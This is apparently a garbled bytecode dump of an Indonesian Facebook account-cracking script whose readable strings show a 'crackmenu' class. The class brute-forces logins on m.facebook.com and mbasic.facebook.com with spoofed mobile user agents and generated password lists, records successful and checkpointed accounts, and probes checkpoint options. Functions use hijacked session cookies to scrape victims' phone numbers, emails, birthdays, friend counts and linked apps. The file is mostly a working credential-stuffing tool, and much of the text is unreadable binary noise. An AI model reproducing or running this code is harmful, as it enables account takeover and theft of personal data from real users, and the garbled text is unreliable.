checkpointr�   rl   rd   rk   �=https://graph.facebook.com/%s?fields=birthday&access_token=%srK   r  rc  �%s |-->%s%s|%s|%s %s %s       �%s|%s|%s %s %sre  � %s |-->%s%s|%s                 �%s|%s�play-audio data/cp.mp3�.r<   r   r=   r�   r�   r   r�   r�   r�   r@   rv   �ok�cprA   �lowerr�   rX   rY   r�   �updaterZ   ra   r_   r`   r^   rb   rP   rL   �get_dict�join�itemsr  rq   r�  r�   ro  r�   r�   rr   r�   rt   �	bulan_ttlr   r�   r�   r  )r�   rl  �	kiky__gtgrm  �user_gg�session�p�dataaZ_headers�por�   �wrt�zczcr�   rd   �cp_ttlr�   r�   r�   rC   rC   rD   �free_v1�  s:   <


(6$
�"P�zcrackmenu.free_v1c                 C   s�  t j�dttt�� �d�ttt	| j
�t	t�t	t�tf	 �f t j��  ddk�rd|D �]2}|�� }tddg�}t�� }|j�dd|ddd	d
ddddddd�� |�d�j}t�dt|���d�t�dt|���d�|d|dd�}|jd|dd�}d|j�� v r�d�dd� |j�� �� D ��}	d |||	f }
t�|
� t d!t! d" d#��d$|
 � d%tt"|||	f }t#||	|� t$�%d&�  n�d'|j�� v �r]zWt d(d)��&� }d*t d+d)��&� i}tjd,||f |d-��'� d. }|�(d/�\}}}t)| }t*d0tt+|||||f � d1|||||f }
t�|
� t d2t! d" d#��d$|
 � W  n@ t,t-f�y/   d}d}d}Y n   Y t*d3tt+||f � d4||f }
t�|
� t d2t! d" d#��d$|
 � t$�%d5�  nq*td7 ad S d S )6Nr�  r   r   r�  ��Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36�m.facebook.comr�   r�  r�  �none�navigate�?1r�  � https://developers.facebook.com/�gzip, deflater�   r�  �lhttps://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2Fr�  r2   rQ   r�  r�  r�  �Chttps://m.facebook.com/login/device-based/validate-password/?shbl=0Fr�  r�  r�  c                 S   r�  r�  rC   r�  rC   rC   rD   r�  �  r�  z'crackmenu.mobile_v2.<locals>.<listcomp>r�  rd  r�   rm   r�  r�  r�  r�  r�   rl   rd   rk   r�  rK   r  rc  r�  r�  re  r�  r�  r�  r�  )r�   rl  r�  rm  r�  r�  r�  r�  r�  r�   r�  r�  r�   rd   r�  r�   r�   r�   rC   rC   rD   �	mobile_v2�  s>   <


�(6
�"P�zcrackmenu.mobile_v2c                 C   s�  t j�dttt�� �d�ttt	| j
�t	t�t	t�tf	 �f t j��  ddk�rt|D �]B}|�� }t�� }|j�ddddddd	d
dddddd�� |�d�j}t�dt|���d�t�dt|���d�|d|dd�}|j�ddddddddd	d
dddddd�� |jd|dd�}d |j�� v r�d!�d"d#� |j�� �� D ��}d$|||f }	t�|	� td%t  d& d'��d(|	 � d)tt!|||f }
t"|||
� t#�$d*�  n�d+|j�� v �rmzWtd,d-��%� }d.td/d-��%� i}tjd0||f |d1��&� d2 }|�'d3�\}}}t(| }t)d4tt*|||||f � d5|||||f }	t�|	� td6t  d& d'��d(|	 � W  n@ t+t,f�y?   d}d}d}Y n   Y t)d7tt*||f � d8||f }	t�|	� td6t  d& d'��d(|	 � t#�$d9�  nq*td7 ad S d S ):Nr�  r   r   r�  r�   ��[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]r�  r�  r�  r�  r�  r�  rH   r�  r�  r�  r�  r�  r2   rQ   r�  r�  r�  r�   �https://m.facebook.comr�  r�  r�  �Hhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0Fr�  r�  r�  c                 S   r�  r�  rC   r�  rC   rC   rD   r�    r�  z'crackmenu.mobile_v3.<locals>.<listcomp>r�  rd  r�   rm   r�  r�  r�  r�  r�   rl   rd   rk   r�  rK   r  rc  r�  r�  re  r�  r�  r�  )-r<   r   r=   r�   r�   r   r�   r�   r�   r@   rv   r�  r�  rA   r�  rX   rY   r�   r�  rZ   ra   r_   r`   r^   rb   rP   rL   r�  r�  r�  r  rq   r�  r�   ro  r�   r�   rr   r�   rt   r�  r   r�   r�   r  )r�   rl  r�  rm  r�  r�  r�  r�  r�   r�  r�  r�   rd   r�  r�   r�   r�   rC   rC   rD   �	mobile_v3�  s8   <


(6,
�"P�zcrackmenu.mobile_v3c                 C   s�  t j�dttt�� �d�ttt	| j
�t	t�t	t�tf	 �f t j��  ddk�r{|D �]I}|�� }t�� }t�ddg�}|j�dd|ddd	d
ddddddd�� |�d�j}t�dt|���d�t�dt|���d�|d|dd�}|j�ddddd|dd	d
ddddddd�� |jd|dd�}d |j�� v r�d!�d"d#� |j�� �� D ��}	d$|||	f }
t� |
� t!d%t" d& d'��d(|
 � d)tt#|||	f }t$||	|� t%�&d*�  n�d+|j�� v �rtzWt!d,d-��'� }d.t!d/d-��'� i}tjd0||f |d1��(� d2 }|�)d3�\}}}t*| }t+d4tt,|||||f � d5|||||f }
t� |
� t!d6t" d& d'��d(|
 � W  n@ t-t.f�yF   d}d}d}Y n   Y t+d7tt,||f � d8||f }
t� |
� t!d6t" d& d'��d(|
 � t%�&d9�  nq*td7 ad S d S ):Nr�  r   r   r�  z�[FBAN/FB4A;FBAV/223.0.0.47.120;FBBV/156649505;FBDM/{density=2.625,width=1080,height=2034};FBLC/sv_SE;FBRV/0;FBCR/Telia;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]r�  r�   r�  r�  r�  r�  r�  r�  rI   r�  r�  r�  zqhttps://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2Fr�  r2   rQ   r�  r�  r�  r�   rU   r�  r�  r�  Fr�  r�  r�  c                 S   r�  r�  rC   r�  rC   rC   rD   r�  '  r�  z'crackmenu.mobile_v4.<locals>.<listcomp>r�  rd  r�   rm   r�  r�  r�  r�  r�   rl   rd   rk   r�  rK   r  rc  r�  r�  re  r�  r�  r�  )/r<   r   r=   r�   r�   r   r�   r�   r�   r@   rv   r�  r�  rA   r�  rX   rY   r�   r   r�   r�  rZ   ra   r_   r`   r^   rb   rP   rL   r�  r�  r�  r  rq   r�  r�   ro  r�   r�   rr   r�   rt   r�  r   r�   r�   r  )r�   rl  r�  rm  r�  Z	ua_randomr�  r�  r�  r�   r�  r�  r�   rd   r�  r�   r�   r�   rC   rC   rD   �	mobile_v4  s@   <


�(6,
�"P�zcrackmenu.mobile_v4c                 C   s�  t j�dttt�� �d�ttt	| j
�t	t�t	t�tf	 �f t j��  |D �]L}|�� }t�� }|dddddddd	d
dddd�}|jd|� d�|d�}t�dt|j���d�t�dt|j���d�|d|dd�}|ddd| ddddddd	d
d| d ddd�}	|jd|� d�||	dd�}
d|j�� v r�d �d!d"� |j�� �� D ��}d#|||f }t�|� td$t d% d&��d'| � d(tt|||f }t |||� t!�"d)�  n�d*|j�� v �rrzWtd+d,��#� }d-td.d,��#� i}tjd/||f |d0��$� d1 }|�%d2�\}}}t&| }t'd3tt(|||||f � d4|||||f }t�|� td5t d% d&��d'| � W  n@ t)t*f�yD   d6}d6}d6}Y n   Y t'd7tt(||f � d8||f }t�|� td5t d% d&��d'| � t!�"d9�  nq%td7 ad S ):Nr�  r   r�   r�  r�  r�  r�  r�  r�  r�  rH   r�  r�  r�  �https://�V/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F�r�   r�  r2   rQ   r�  r�  r�  r�   r�  r�  r�  �-/login/device-based/validate-password/?shbl=0F�rW   r�   r�  r�  r�  c                 S   r�  r�  rC   r�  rC   rC   rD   r�  D  r�  z$crackmenu.metode.<locals>.<listcomp>r�  rd  r�   rm   r�  r�  r�  r�  r�   rl   rd   rk   r�  rK   r  rc  r�  r�  re  r   r�  r�  r�  �+r<   r   r=   r�   r�   r   r�   r�   r�   r@   rv   r�  r�  rA   r�  rX   rY   rZ   r_   r`   r^   ra   rb   rP   rL   r�  r�  r�  r  rq   r�  r�   ro  r�   r�   rr   r�   rt   r�  r   r�   r�   r  )r�   rl  r�  rg   rm  r�  Zheaderrl   Zdas�header1r�  r�   r�  r�  r�   rd   r�  r�   r�   r�   rC   rC   rD   r�  7  s4   <

 :0
�"Pzcrackmenu.metodec                 C   s  t j�dttt�� �d�ttt	| j
�t	t�t	t�tf	 �f t j��  |}|D �]^}|�� }t�� }ddddddd	d
dddddd�}|jd|d�}t�dt|j���d�t�dt|j���d�|d|dd�}i dd�dd�dd�dd�dd�d d!�d"d#�d$d�d%d�d&d'�d(d
�d)d�d*d�d+d�d,d�d-d�}	|jd.||	d/d0�}
d1|j�� v r�d2�d3d4� |j�� �� D ��}d5|||f }t�|� td6t d7 d8��d9| � d:tt|||f }t |||� t!�"d;�  n�d<|j�� v �r�zWtd=d>��#� }d?td@d>��#� i}tjdA||f |dB��$� dC }|�%dD�\}}}t&| }t'dEtt(|||||f � dF|||||f }t�|� tdGt d7 d8��d9| � W  n@ t)t*f�yX   dH}dH}dH}Y n   Y t'dItt(||f � dJ||f }t�|� tdGt d7 d8��d9| � t!�"dK�  nq'td7 ad S )LNr�  r   r�  r�   r�   z{NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+z�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r�  r�  r�  r�  r�  r�  r�  r�   )r�  r�   r�   rJ   r�   r�  r�  r�  r�  r�  r�   r�  r�   z�https://m.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQ1NTE3NDA0LCJjYWxsc2l0ZV9pZCI6Mjc2MjMwNjIxNzQyMjQ4NX0%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2F%3Flocale%3Did_ID&refsrc=deprecated&_rdrr�  r�  r2   rQ   r�  z-https://developers.facebook.com/?locale=id_IDr�  r�  zcontent-lengthZ129r�   r�   r�   r�  r�   r�  rJ   z�Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G925F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36r�   r�  r�  r�  r�  r�  r�  r�   r�  r�   r�  Tr�  r�  r�  c                 S   r�  r�  rC   r�  rC   rC   rD   r�  �  r�  z'crackmenu.metode_v1.<locals>.<listcomp>r�  rd  r�   rm   r�  r�  r�  r�  r�   rl   rd   rk   r�  rK   r  rc  r�  r�  re  r   r�  r�  r�  r�  )r�   �idfr�  rl  rm  r@  r�  r�   �dt�header2�jr�   r�  r�  r�   rd   r�  r�   r�   r�   rC   rC   rD   �	metode_v1T  s�   <

����������	�
�������
�"Pzcrackmenu.metode_v1c                 C   s�  t j�dttt�� �d�ttt	| j
�t	t�t	t�tf	 �f t j��  |}|D �]L}|�� }t�� }|dddddddd	d
dddd�}|jd|� d�|d�}t�dt|j���d�t�dt|j���d�|d|dd�}	|ddd| ddddddd	d
d| d ddd�}
|jd|� d�|	|
dd�}d|j�� v r�d �d!d"� |j�� �� D ��}d#|||f }t�|� td$t d% d&��d'| � d(tt|||f }t |||� t!�"d)�  n�d*|j�� v �rtzWtd+d,��#� }d-td.d,��#� i}tjd/||f |d0��$� d1 }|�%d2�\}}}t&| }t'd3tt(|||||f � d4|||||f }t�|� td5t d% d&��d'| � W  n@ t)t*f�yF   d6}d6}d6}Y n   Y t'd7tt(||f � d8||f }t�|� td5t d% d&��d'| � t!�"d9�  nq'td7 ad S ):Nr�  r   r�   r�  r�  r�  r�  r�  r�  r�  rH   r�  r�  r�  r�  r�  r�  r�  r2   rQ   r�  r�  r�  r�   r�  r�  r�  r�  Fr�  r�  r�  c                 S   r�  r�  rC   r�  rC   rC   rD   r�  �  r�  z'crackmenu.metode_v3.<locals>.<listcomp>r�  rd  r�   rm   r�  r�  r�  r�  r�   rl   rd   rk   r�  rK   r  rc  r�  r�  re  r   r�  r�  r�  r�  )r�   r   r�  rg   rl  rm  r@  r�  Zrgr  r  Zrpr�   r�  r�  r�   rd   r�  r�   r�   r�   rC   rC   rD   �	metode_v3�  s6   <

 :0
�"Pzcrackmenu.metode_v3c                 C   �J  t d� t d� tdt� dt� �� tdt� dt� d��}|dv r/td� t�d	� | ��  nH|d
v rWt d� td� td� tdt� dt� �� td��	d�}d}t d� n |dv rbt d� d}nt d� td� t d� t�d	� | ��  | �
�  tdd��|}| jD ]p}zi|�	d�\}}|�	d�}|d }	t|	�dkr�|	|	d |	d |	d |g}
n0t|	�dkr�|	d |	d |g}
n t|	�dkr�|	d |	d |	d |g}
n|	|	d |	d |	d |g}
|d v r�|
}
n|
| }
|�| j||
� W q�   Y q�W d   � n1 s�w   Y  t�| j� t d� t d� t d� t d!� | ��  tj��  d S �"Nr.  r;  �>Sebelum Lanjut Apakah Anda Mau Menggunakan Password Gabungan :� |-->Pilih (�Y/n�) :�r   r   � |-->Jangan Kosong Sayanf.....r2   �r  r  �G�g�4 |-->Silahkan Gunakan Koma Untuk Pemisah Password...�K |-->Semakin Banyak Password Yang Anda Gunakan, Semakin Leled Saat Crack...� |-->Contoh : �sayang,kontol,anjing� |-->Password : r�  r  �r>   �nr  �Tr>   � |-->Isi Dengan Benar Dong...r�  r_  r�   r8   r   �   �123�1234�12345r�   rv  �r>   r  � |-->Crack Selesai)r   r�   r�   r�   r�   r:   r;   r�  r�   rt   r�  r`  rv   r@   rT   Z	mobile_v1r�   r]  r�  �
check_opsir<   r{   �r�   ZoagZtambahxZpasqrN   �unameZid_zZnama_aqZzZzZZzaqZpww_rC   rC   rD   r�  �  �h   






��zcrackmenu.Opsi_v1c                 C   r  r  )r   r�   r�   r�   r�   r:   r;   r�  r�   rt   r�  r`  rv   r@   rT   r�  r�   r]  r�  r   r<   r{   r!  rC   rC   rD   r�  �  r#  zcrackmenu.Opsi_v2c                 C   r  r  )r   r�   r�   r�   r�   r:   r;   r�  r�   rt   r�  r`  rv   r@   rT   r�  r�   r]  r�  r   r<   r{   r!  rC   rC   rD   r�  $  r#  zcrackmenu.Opsi_v3c                 C   �N  t d� t d� tdt� dt� �� tdt� dt� d��}|dv r/td� t�d	� | ��  nH|d
v rWt d� td� td� tdt� dt� �� td��	d�}d}t d� n |dv rbt d� d}nt d� td� t d� t�d	� | ��  | �
�  tdd��}}| jD ]q}zj|�	d�\}}|�	d�}|d }	t|	�dkr�|	|	d |	d |	d |g}
n0t|	�dkr�|	d |	d |g}
n t|	�dkr�|	d |	d |	d |g}
n|	|	d |	d |	d |g}
|d v r�|
}
n|
| }
|�| j||
d!� W q�   Y q�W d   � n	1 �sw   Y  t�| j� t d� t d� t d� t d"� | ��  tj��  d S �#Nr.  r;  r  r	  r
  r  r  r  r2   r  r  r  r  r  r  r�  r  r  r>   r  r�  r_  r�   r8   r   r  r  r  r  r�   rv  r  r�  r  )r   r�   r�   r�   r�   r:   r;   r�  r�   rt   r�  r`  rv   r@   rT   r�  r�   r]  r�  r   r<   r{   r!  rC   rC   rD   r�  ^  �h   






��zcrackmenu.Opsi_v4c                 C   r$  r%  )r   r�   r�   r�   r�   r:   r;   r�  r�   rt   r�  r`  rv   r@   rT   r  r�   r]  r�  r   r<   r{   r!  rC   rC   rD   r�  �  r&  zcrackmenu.Opsi_v5c                 C   s2  t d� t d� tdt� dt� �� tdt� dt� d��}|dv r/td� t�d	� | ��  nH|d
v rWt d� td� td� tdt� dt� �� td��	d�}d}t d� n |dv rbt d� d}nt d� td� t d� t�d	� | ��  | �
�  tdd��|}| jD ]p}zi|�	d�\}}|�	d�}|d }	t|	�dkr�|	|	d |	d |	d |g}
n0t|	�dkr�|	d |	d |g}
n t|	�dkr�|	d |	d |	d |g}
n|	|	d |	d |	d |g}
|d v r�|
}
n|
| }
|�| j||
� W q�   Y q�W d   � n1 s�w   Y  t�| j� t d!� | ��  tj��  d S )"Nr.  r;  r  r	  r
  r  r  z |-->Jangan Kosong Sayang.....r2   r  r  r  r  r  r  r�  r  r  r>   r  r�  r_  r�   r8   r   r  r  r  r  r�   rv  r  z -->Crack Selesai)r   r�   r�   r�   r�   r:   r;   r�  r�   rt   r�  r`  rv   r@   rT   r  r�   r]  r�  r   r<   r{   r!  rC   rC   rD   r�  �  sb   






��zcrackmenu.Opsi_v6c              	   C   s�   t d� tdt� dt� d��}|dv rbtdttt�tf � tD ]2}|�dd�}|�d	�}td
� td| � z| �	|d |d � W q  t
jjyN   Y q    Y q td
� t d� tj��  d S tj��  d S )NzC --> Sebelum Lanjut Harap Hidup Matikan Mode Pesawat Selama 2.Detikz( --> Apakah Anda Mau Lasung Check Opsi (r
  z):)r  r  z) --> Total Akun Yang Check Point : %s%s%sr�   r   rh  r.  rp  r   r2   z" |--> Check Akun Sudah Selesai....)r�   r�   r�   r�   r   r@   r�  rZ  rt   rq  rX   rr  r   r�   r<   r{   )r�   Zaskrs  r�   rt  rC   rC   rD   r     s    

zcrackmenu.check_opsic                 C   sJ  i }d}d}t �� }|j�ddd|d|ddd	d
dd|d ddd�� t|j|d d|id�jd�}|�dddi�}|�dddi�}	g d�}
|�d�D ]}|�d�|
v ra|�|�d�|�d�i� qJqJ|�||d�� t|j	||�d� |dd�jd�}d|j
�� v r�d |jv r�td!t� d"t� �� d S td!t� d#t� �� d S d$|j
�� v �ryt�d%t|��}|�d�}|�ddd&i�d }|�ddd'i�d }|�ddd(i�d }||||d)d*|d+�}t|j	||d  |d,�jd�}d-d.� |�d/�D �}tt|��� }|d0k�rItd1t tt|�� t d2 � d3|v �r"td!t� d4t� �� d S d5t�d%t|��v �r9td!t� d6t� �� d S td!t� d)�|�� t� �� d S td1t tt|�� t d2 � tt|��D ]}td!t� t|d7 �� t� d8|| � �� �q_d S d9t|�v �r�|�d:d;d9i��d:�j}td!t� |� t� �� d S td!t� d<t� �� d S )=NrU   z�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]r�  r�   r�   r�  z�text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9r�  r�  r�  r�  r�  z/login/?next&ref=dbl&fl&refid=8r�  zid-ID,id;q=0.9r�  rJ   r�  rM   rN   rO   rP   )r�  rS   Zm_tsZliZ
try_numberZunrecognized_triesr�   Zbi_xrwhr�   r�   r�  )�emailr�  rV   Tr�  r�  zAkun Anda Dikunci� |--->zAkun Ini Terkunci..z/Selamat Akun Ini, Tidak Terkenak Check Point...r�  z\<title>(.*?)<\/title>rR   rS   �nhr   Z	Lanjutkan)rR   rR   rS   rS   Zcheckpoint_datazsubmit[Continue]r)  r�   c                 S   s   g | ]}|j �qS rC   )ra   )r�  ZyyrC   rC   rD   r�  5  s    z)crackmenu.cek_opsi_cp.<locals>.<listcomp>Zoptionr   z |--->Terdapat z Opsiz.Lihat detail login yang ditampilkan. Ini Anda?zSelamat Akun Ini Tap Yes...z%Masukkan Kode Masuk untuk MelanjutkanzAkun Ini Terkenak A2Fr2   ri  Zlogin_errorrY  rv   zKata Sandi Salah...)rX   rY   r�   r�  r?  rZ   ra   rs   r]   rP   rL   r�  r   r�   r�   r�   r_   rA  r^   r@   r�   r�  r9   rx   )r�   rl  ZpaswrW   Zmbr�  r@  ZgedZfmZlink2�listrB   �runZeaxrN   ZdtsgZjzstr)  ZdataDr�   ZngewZZzZzZoptZohrC   rC   rD   rq    sV   0*"


 
  ,�zcrackmenu.cek_opsi_cpN)r�   r�   r�   r�   r�  r�  r�  r  r�  r�  r�  r�  r�  r  r  r�  r�  r�  r�  r�  r�  r   rq  rC   rC   rC   rD   r  a  s*    6#""D77:689r  c           "      C   s  d}| }|}t �� }|}|�dd�}d}|�d| d d�}|�d| d d�}|�d| d�}|�d| d�}||7 }|d7 }|d7 }||7 }|}	|jdd|	id�j}
d	t�d
t|
��v �rv|jdd|	id�j}t�d
t|��d }|jdd|	id�j}|jdd|	id�j}|jd|� d�d|	id�j}|jd|� d�d|	id�j}zt�dt|��d }W n   d}Y zt�dt|��d �dd�}W n   d}Y zt�dt|��d }W n   d}Y zt�dt|��d }W n   d}Y zt�dt|��d }W n   d}Y zd}t�dt|��}|D ]	}||d 7 }�qW n   Y |t� dt	� |� t
� d t	� |� t
� d!t	� |� t
� d"t	� |� t
� d#t	� |� t
� d$t	� |� t
� d%t	� |� t
� d&�7 }d'\}}|jdd|	id�j}
|jd(d|	id�j}d	t�d
t|
��v �rm|d)7 }d*|
v �r�|d+7 }ni|d,7 }t�d-t|
��}t�d.t|
��}|D ]R}|}|d7 }z"t�d/t|��}d0|d  }|�d1d��d2d��d3d��d4d�}W n   |}Y |d5t� t� |� t� d6t� |� d7t� || � t� d&�7 }|d7 }�q�d8|v �r�|d97 }nxd'\}}|d:7 }t�d-t|��} t�d.t|��}!| D ]R}|}|d7 }z"t�d/t|��}d0|d  }|�d1d��d2d��d3d��d4d�}W n   |}Y |d5t� t� |� t� d6t� |� d7t� |!| � t� d&�7 }|d7 }�qn
|d;t� d<�7 }n	 t|d& | � d S )=Nr   �
noscript=1�c_user=r�  �;c_user=�<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activerd   rK   �Diakses menggunakan Facebook�\<title\>(.*?)<\/title\>�'https://mbasic.facebook.com/profile.phpr   �.https://mbasic.facebook.com/profile.php?v=info�1https://mbasic.facebook.com/profile.php?v=friendsrI   ��/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_�Fhttps://mbasic.facebook.com/timeline/app_collection/?collection_token=�#%3A184985071538002%3A32&_rdc=1&_rdr�=\<a\ href\="tel\:\+.*?">\<span\ dir\="ltr">(.*?)<\/span><\/a>�-�W\<a href\="https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?" target\=".*?"\>(.*?)<\/a\>�&#064;�@�h\<\/td\>\<td\ valign\="top" class\=".*?"\>\<div\ class\=".*?"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>�+\<h3\ class\=".*?"\>Teman\ \((.*?)\)<\/h3\>r   �%\<span\ class\=".*?"\>(.*?)\<\/span\>r2   �%\<div\ class\=".*?" id\="year_(.*?)">�, � |-->Nama Akun       : �
 |-->Jumlah Teman    : �
 |-->Jumlah Pengikut : �
 |-->Email Aktif     : �
 |-->Nomor Aktif     : �
 |-->Tahun Akun      : �
 |-->Tanggal Lahir   : r�   �r   r   �>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive� |--->Aplikasi Yang Terkait*
�AAnda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.�- |--->Tidak Ada Aplikasi Aktif Yang Terkait*
� |--->Aplikasi Aktif*
�;\/><div\ class\=".*?"\>\<span\ class\=".*?"\>(.*?)<\/span\>�2\<div\>\<\/div\>\<div\ class\=".*?"\>(.*?)<\/div\>z\<a\ href\=".*?"\>(.*?)<\/a\>r�   r   �]�'�"r(  r{  r8   �FAnda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau�2 |--->Tidak Ada Aplikasi Kedaluwarsa Yang Terkait*� |--->Aplikasi Kedaluwarsa*
rz  �Cookies Error !�rf   rY   rZ  rZ   ra   r_   rA  r^   r�   r�   ry   r�   r�   r�   r�   rx   r   )"r�  �cokii�memek_mamak_yayan�
kntl_yayanrl  �akun_nnr�  �	kukis_sus�kukis_imposr�   �cek�get_idr�   �response�	response2�	response3�	response4�nomerr'  r�  �teman�pengikut�tahun�cek_thn�nenen�hit1�hit2�cek2�apkAktif�ditambahkan�munculZtor�apkKadaluarsa�
kadaluarsarC   rC   rD   ro  H  s�   "�p

(8

(8�ro  c           "      C   sb  d}| }|}t �� }|}|�dd�}d}	|�d| d d�}|�d| d d�}|�d| d�}|�d| d�}|	|7 }	|	d7 }	|	d7 }	|	|7 }	|	}
|jdd|
id�j}d	t�d
t|��v �r |jdd|
id�j}t�d
t|��d }|jdd|
id�j}|jdd|
id�j}|jd|� d�d|
id�j}|jd|� d�d|
id�j}zt�dt|��d }W n   d}Y zt�dt|��d �dd�}W n   d}Y zt�dt|��d }W n   d}Y zt�dt|��d }W n   d}Y zt�dt|��d }W n   d}Y zd}t�dt|��}|D ]	}||d 7 }�qW n   Y |t� dt	� |� t
� d t	� |� t
� d!t	� |� t
� d"t	� |� t
� d#t	� |� t
� d$t	� |� t
� d%t	� |� t
� d&�7 }d'\}}|jdd|
id�j}|jd(d|
id�j}d	t�d
t|��v �r|d)7 }d*|v �r�|d+7 }n>|d,7 }t�d-t|��}t�d.t|��}|D ]'}|d7 }|d/t� t� |� t� d0t� |� d1t� || � t� d&�7 }|d7 }�q�d2|v �r�|d37 }nMd'\}}|d47 }t�d-t|��} t�d.t|��}!| D ]'}|d7 }|d/t� t� |� t� d0t� |� d1t� |!| � t� d&�7 }|d7 }�q�n
|d5t� d6�7 }n	 td7| d& | d& | � d S )8Nr   r,  r-  r�  r.  r/  rd   rK   r0  r1  r2  r   r3  r4  rI   r5  r6  r7  r8  r9  r:  r;  r<  r=  r>  r   r?  r2   r@  rA  rB  rC  rD  rE  rF  rG  rH  r�   rI  rJ  rK  rL  rM  rN  rO  rP  r(  r{  r8   rT  rU  rV  rz  rW  r;  rX  )"r�  rY  rZ  Zua_randor[  rl  r\  r�  r]  r^  r�   r_  r`  r�   ra  rb  rc  rd  re  r'  r�  rf  rg  rh  ri  rj  rk  rl  rm  rn  ro  rp  rq  rr  rC   rC   rD   �cek_cookies_by_risky_ua�  s�   "�p

8

8� rs  c                   @   r~   )�Main_c                 C   s   d}d S )Nr   rC   )r�   ZmsinrC   rC   rD   r�   �  s   zMain_.__init__c                 C   s�   z
t �d�j�� }W n t jjy   tj�d� Y nw ||kr,t�	d� t�	d� d S t�	d� t
td t | t d t | t d � td	� t
d
� t
d� td� td	� tj�td � d S )N�6https://github.com/Hamii-king-06/OLD/main/Approval.txt� |-->Jaringan Anda Down�git pullr�   zgit pull;clearzVersion Script Ini (z) Akan Diupdate Menjadi (r�   r.  z. |-->Tunggu Sebentar Sedang Update Script.....zG |-->Jika Masih Stuck Update/Gini Terus Silahkan Gunakan Pernintah Ini z |-->python update.pyzJalankan Lagi Script....)rX   rZ   ra   �striprr  r   r�   r<   r{   r�   r�   r�   r�   r�   r   )r�   Zversion_�versionrC   rC   rD   Z__check_update_�  s    �

,zMain_.__check_update_c                 C   sh   z
t �d�j�� }W n t jjy   tj�d� Y nw ||kr"d S t	t
d � t�d� tj��  d S )Nru  rv  z?Maaf Script Sedang Maintenance Harap Coba Lagi, Lain Waktu.....rw  )rX   rZ   ra   rx  rr  r   r�   r<   r{   r�   r�   r�   )r�   ZmainxZmainzrC   rC   rD   Z__check_status_	  s   �
zMain_.__check_status_c                 C   s$   | � d� | �d� t�  t�  d S )Nz1.1.2ZOn)�_Main___check_update_�_Main___check_status_Zcek_token_eeqr�   r�   rC   rC   rD   �_no_vpn	  s   


zMain_._no_vpnc                 C   s
   t �  d S r�  )r�   r�   rC   rC   rD   �__vpn__	  r�  zMain_.__vpn__N)r�   r�   r�   r�   rz  r{  r|  r}  rC   rC   rC   rD   rt  �  s    
rt  )�ZAuthorZFacebookZ
InstragramZ
LicenseKeyZVersionr�   Z	Postinganr�   r<   ZrichrX   �ModuleNotFoundErrorr   r�   Zbs4Z	mechanizeZgTTSr:   r   r�   Zhashlibr_   Z	threadingr�   Zurllibr
  Z	ipaddressZcalendarr~  �base64�platformZstructrf   Z
rich.tabler   r�   Zrich.consoler   Zsolr   ZsopZconcurrent.futuresr   Ztredr   ZgpZ
rich.panelr   ZnelZcetakZrich.markdownr	   ZmarkZrich.columnsr
   ZcolZrequests.exceptionsr   r?  r[   r   r�   r`  Zurllib.parser   r   rq   �devnullZnullZcallZSTDOUTZinsta�mkdir�ZZM2ZH2ZK2ZB2r�   ZP2�Jr�  r>   r�  r�   r�   rx   r�   r�   ry   r?   r�   r�   r�   r�   ZjarakZubahPZpwbarurW   Zdata2r�   r�  r�  r�  rv   ZnampungZpwBarur\  r�   rw  r�   Zcurrentr^   r�   r�  r�   rh  r�   Zbulanr�   ZhariZwaktuur�   Zjamzr�  Z_my_account_ZskrngZ	bulan_cekr{   Zbulan_skrng�
ValueErrorr�   ZtanggalZ
ua_defaultZ	ua_xiaomiZua_nokiaZua_asusZ	ua_huaweiZua_vivoZua_oppoZ
ua_samsungZ
ua_windowsZkomentarrE   r�   r�   Zkata_devr�   Zm_fbZmbasicZheader_gruprj   rw   r}   r   r�   r�   r�   r�   r�   r�   r�  r�  r�  r  ro  rs  rY   r@  rt  r}  rC   rC   rC   rD   �<module>   sf  $$$�(X


�	'       o&     lYM'